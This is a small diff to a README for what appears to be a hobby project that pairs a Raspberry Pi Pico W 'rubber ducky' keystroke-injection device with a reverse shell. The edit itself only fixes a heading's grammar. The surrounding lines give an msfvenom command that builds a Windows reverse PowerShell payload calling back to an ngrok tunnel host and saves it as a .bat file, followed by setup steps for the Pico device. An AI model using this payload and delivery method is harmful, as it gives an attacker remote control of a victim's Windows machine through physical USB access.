@@ -11,7 +11,7 @@ For port forwarding
 Generate windows reverse PowerShell payload<br>
 ```msfvenom -p cmd/windows/reverse_powershell lhost=0.tcp.in.ngrok.io lport=10448 > ayush.bat ```<br><br>
 ![msf](https://github.com/aayushdangol16/Reverse-shell-by-rubber-ducky/blob/main/msf.png)
-## Rasberry pi pico w as rubber ducky
+## Rasberry pi pico w as a rubber ducky
 1. Clone the repo to get a local copy of the files. `git clone https://github.com/dbisu/pico-ducky.git`
 2. Download [CircuitPython for the Raspberry Pi Pico W](https://circuitpython.org/board/raspberry_pi_pico_w/). *Updated to 8.0.0
 3. Plug the device into a USB port while holding the boot button. It will show up as a removable media device named `RPI-RP2`.
